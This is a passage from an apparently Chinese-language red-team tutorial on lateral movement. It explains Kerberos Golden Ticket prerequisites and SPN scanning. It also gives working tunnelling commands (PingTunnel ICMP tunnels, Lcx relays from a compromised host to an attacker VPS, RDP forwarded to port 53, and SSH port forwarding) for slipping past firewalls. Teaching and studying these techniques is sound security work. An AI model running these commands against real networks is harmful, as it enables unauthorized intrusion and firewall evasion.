# 四、PTT票据传递在横向移动中的利用

PTT（Pass the Ticket）不再使用NTLM进行认证，而是利用Kerberos协议进行攻击。相对于PTH来说，其不需要管理员权限。

常见的攻击方式有三种：`MS14-068`（漏洞编号`KB3011780`）、Golden Ticket、Silver Ticket。其中后两者是将连接合法的票据注入内存中，属于权限维持（后面介绍）。

## 4.2 Golden Ticket

Golden Ticket使用`krbtgt`账户的密码Hash值，利用伪造的高权限TGT向KDC要求颁发拥有任意服务访问权限的票据，从而获得域控权限。

在域环境中，每个账户的票据都是由`krbtgt`生成的。当攻击者得到`krbtgt` Hash或AES256值后，就可以伪造任意域用户的身份，并使用该身份进行访问。

伪造Golden Ticket的利用条件：

1. `krbtgt`用户Hash或AES256值
2. 域名称
3. 域的SID值
4. 要伪造的管理员名

# 五、利用SPN服务进行横向移动

在域环境中，SPN扫描是查找相关服务的较好方法，可以从相关服务着手，例如MSSQL、WSMAN、Exchange、TERMSERV、Hyper-V。

# 六、隧道通信

## 6.1 网络层隧道

ICMP隧道是网络层常用的隧道之一。在ICMP协议中，设备间通信不需要开放相应端口。当攻击者使用各类上层隧道进行通信均失败时，可以通过`ping`命令访问目标计算机，并尝试建立ICMP隧道，将TCP/UDP等需要传输的数据封装到`ping`数据包中，从而穿过防火墙实现通信。

其中，PingTunnel是常用的ICMP隧道工具，可跨平台使用。下面使用该工具进行相应操作。

先在受控端（Web服务器）运行PingTunnel工具，执行开启隧道命令：

```bash
sudo ./pingtunnel -type server
```

![](upload/attach/202106/718877_AB5W5S5BHVS4WUJ.png)

在控制端（公网VPS）执行下面命令，打开需要监听的本地端口。该命令会将指定服务器相应端口的数据封装在ICMP隧道中，并以受控端（Web服务器）为ICMP隧道跳板进行传输。

```bash
pingtunnel -type client -l :本地所监听的端口 -s 受控端IP -t 指定要转发的目标IP:指定要转发的目标端口 -tcp 1

pingtunnel -type client -l :33444 -s 192.168.74.132 -t 192.168.96.145:80 -tcp 1
```

![](upload/attach/202106/718877_QK2JRKQ45MF9NWQ.png)

访问本地监听端口：

![](upload/attach/202106/718877_C8ZWJ3GX3BUZKPD.png)

## 6.2 传输层隧道

Lcx是传输层经典的转发工具。Lcx是一个基于Socket套接字实现的转发工具，其Linux版本为portmap。

一个正常的Socket隧道必须具备两端：一端为服务端，负责监听一个端口并等待客户端连接；另一端为客户端，通过服务端的地址和端口与其连接，并将相应数据转发给服务端。

在自己的公网VPS（即服务端）执行监听命令，将本机`4444`端口上监听的所有数据转发给本机的`5555`端口，以便其他机器访问：

```cmd
Lcx.exe -listen 4444 5555
```

![](upload/attach/202106/718877_2Y4S34KV657RGWU.png)

在受控端（即客户端）执行数据转发命令，将目标机器的`80`端口转发到公网VPS的`4444`端口：

```cmd
Lcx.exe -slave 公网ip 4444 目标机器IP 80
```

![](upload/attach/202106/718877_FES9GHVB9CEN4KJ.png)

通过VPS的IP和`5555`端口访问目标机器的`80`端口：

![](upload/attach/202106/718877_YA4Z42HDVAZX2PU.png)

同样地，lcx也常用于本地端口映射。当目标服务器由于防火墙限制，部分端口未能通过防火墙时，可以将目标服务器响应端口的数据转发到防火墙允许的端口。

在目标服务器执行下面命令，即可把远程桌面转到`53`端口：

```cmd
Lcx -tran 53 目标服务器IP 3389
```

## 6.3 应用层隧道

应用层隧道通信主要利用应用软件提供的端口转发数据。常见的应用层隧道协议有SSH、HTTP、DNS等。

其中，SSH协议通常被允许通过防火墙和边界设备，且内网中的Linux设备都支持SSH协议。同时，SSH的传输过程是加密的，使得合法的SSH连接和攻击者建立的隧道难以区分。

常用的SSH隧道有以下几种类型：本地转发、远程转发、动态转发。

SSH命令常用参数：

- `-C`：压缩传输，提高速度。
- `-f`：后台执行。
- `-N`：建立静默连接。
- `-g`：允许远程主机连接本地用于转发的端口。
- `-L`：本地端口转发。
- `-R`：远程端口转发。
- `-D`：动态端口转发。
- `-P`：指定SSH端口。

### 本地转发

在VPS执行如下命令。该命令以Web服务器为跳板，将内网服务器的端口映射到公网VPS上，访问对应公网VPS的端口即可：

```bash
Ssh -CfNg -L 公网VPS端口:目标主机IP:目标端口号 root@跳板机IP
```

### 远程转发

当公网VPS无法访问内网服务器（包括Web服务器），但Web服务器能够访问公网VPS时，在Web服务器执行如下命令。

该命令以Web服务器为跳板，将VPS端口的流量转发到内网服务器相应端口上，访问对应公网VPS的端口即可：

```bash
Ssh -CfNg -R vps端口:目标主机IP:目标端口号 root@跳板机IP
```

### 动态转发

动态端口映射时会建立一个SSH加密的Socks4/5代理通道，任何支持Socks4/5协议的程序都可以通过此通道进行代理访问。

在VPS上执行如下命令：

```bash
ssh -CfNg -D 7000 root@代理主机IP
```
